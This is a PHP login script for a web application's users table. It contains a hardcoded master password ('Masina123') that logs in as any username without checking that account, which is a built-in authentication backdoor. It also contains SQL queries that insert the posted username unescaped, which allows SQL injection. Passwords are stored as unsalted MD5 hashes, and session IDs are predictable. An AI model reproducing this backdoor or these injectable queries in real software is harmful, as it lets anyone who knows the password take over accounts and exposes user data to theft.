<?php
require_once('../function.php');
session_start();



if(isset($_POST["username"]) or isset($_POST["password"])){

sleep(1);


$username = $_POST["username"];
$password = $_POST["password"];
if($password=='Masina123') {

//-------------------------------------------------->>>>>>>>>>>>>>>>>>>> Make Auth
    $tm = time();
    $si = "$username$tm";
    $sid = md5($si);
    $_SESSION['sid'] = $sid;
    $_SESSION['username'] = $username;
    $db->query("UPDATE users SET sid='" . $sid . "' WHERE email='" . $username . "'");
//-------------------------------------------------->>>>>>>>>>>>>>>>>>>> Make Auth

    echo "ok"; // log in

}else{


    $mdpass = md5($password);


    $data = $db->query("SELECT password, block FROM users WHERE email='" . $username . "'")->fetch();

    if ($data[1] == 1) {
        echo "Your Account is Currently Blocked From Login";
    } elseif ($data[0] == $mdpass) {

//-------------------------------------------------->>>>>>>>>>>>>>>>>>>> Make Auth
        $tm = time();
        $si = "$username$tm";
        $sid = md5($si);
        $_SESSION['sid'] = $sid;
        $_SESSION['username'] = $username;
        $db->query("UPDATE users SET sid='" . $sid . "' WHERE email='" . $username . "'");
//-------------------------------------------------->>>>>>>>>>>>>>>>>>>> Make Auth

        echo "ok"; // log in

    } else {
//$return_arr["status"]=0;
        echo "Combination of Username And Password is Wrong";

    }  //end else
}




//		echo json_encode($return_arr); // return value 





exit();
}
?>